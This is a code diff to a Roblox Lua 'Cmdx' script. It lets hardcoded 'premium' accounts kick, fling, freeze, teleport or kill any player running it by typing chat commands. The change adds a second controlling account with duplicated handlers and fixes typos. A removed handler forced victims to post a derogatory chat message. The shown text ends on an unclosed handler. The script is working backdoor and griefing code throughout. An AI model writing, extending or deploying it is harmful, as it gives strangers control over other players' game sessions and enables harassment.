@@ -1,5 +1,6 @@
 --// Cmdx User //--
 local user_premium__001 = game.Players.FlavorgamerYT
+local user_premium__002 = game.Players.whoareyiu24
 local player = game.Players.LocalPlayer
 
 --// Commands //--
@@ -10,7 +11,7 @@ end
 
 local unfreeze = function()
 	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
-	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = false
 end
 
 user_premium__001.Chatted:connect(function(cht)
@@ -19,29 +20,27 @@ user_premium__001.Chatted:connect(function(cht)
 			game.Players.LocalPlayer:Kick("Kicked by Premium user")
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(".fling .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-			power = 99999999 -- change this to make it more or less powerful
- 
+			power = 99999999
+
 			game:GetService('RunService').Stepped:connect(function()
-			game.Players.LocalPlayer.Character.Head.CanCollide = false
-			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
-			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+				game.Players.LocalPlayer.Character.Head.CanCollide = false
+				game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+				game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
 			end)
 			wait(.1)
 			local bambam = Instance.new("BodyThrust")
 			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
-			bambam.Force = Vector3.new(power,0,power)
+			bambam.Force = Vector3.new(power, 0, power)
 			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -50,7 +49,6 @@ user_premium__001.Chatted:connect(function(cht)
 			freeze()
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -59,16 +57,14 @@ user_premium__001.Chatted:connect(function(cht)
 			unfreeze()
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(".kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer:kick("You have been kicked.")
+			game.Players.LocalPlayer:Kick("You have been kicked.")
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -77,7 +73,6 @@ user_premium__001.Chatted:connect(function(cht)
 			game.Players.LocalPlayer.Character.Humanoid:Destroy()
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -86,7 +81,6 @@ user_premium__001.Chatted:connect(function(cht)
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -95,7 +89,6 @@ user_premium__001.Chatted:connect(function(cht)
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
 		end
 	end
-
 end)
 
 user_premium__001.Chatted:connect(function(cht)
@@ -108,14 +101,6 @@ user_premium__001.Chatted:connect(function(cht)
 					humanoid.Sit = true
 				end
 			end
-		end
-	end
-end)
-
-user_premium__001.Chatted:connect(function(cht)
-	if cht:match(".bring .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
 		end
 	end
 end)
@@ -164,15 +149,91 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(".cmdx") then
 		if game.Players.LocalPlayer == user_premium__001 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "Cmds:";
-	Text = ".freeze .bring .error .oof .kick .kick .fling .sit .unsit .troll .donate .say .enlighten";
-	Time = 5;
-	Icon = "rbxassetid://505845268";
-})
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Title = ".";
+				Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
+				Time = 5;
+				Icon = "rbxassetid://999999999";
+			})
 		end
 	end
-
 end)
 
----------------------------------------------------------------------
+-- Duplicate for user_premium__002 --
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(":kick .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".fling .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999
+
+			game:GetService('RunService').Stepped:connect(function()
+				game.Players.LocalPlayer.Character.Head.CanCollide = false
+				game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+				game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power, 0, power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".freeze .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			freeze()
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".unfreeze .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			unfreeze()
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".kick .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			game.Players.LocalPlayer:Kick("You have been kicked.")
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".oof .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".error .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
+		end
+	end
+end)
+
+user_premium__002.Chatted:connect(function(cht)
+	if cht:match(".bring .") then
+		if game.Players.LocalPlayer ~= user_premium__002 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__002.Character.UpperTorso.Position)
+		end
+	end
+end
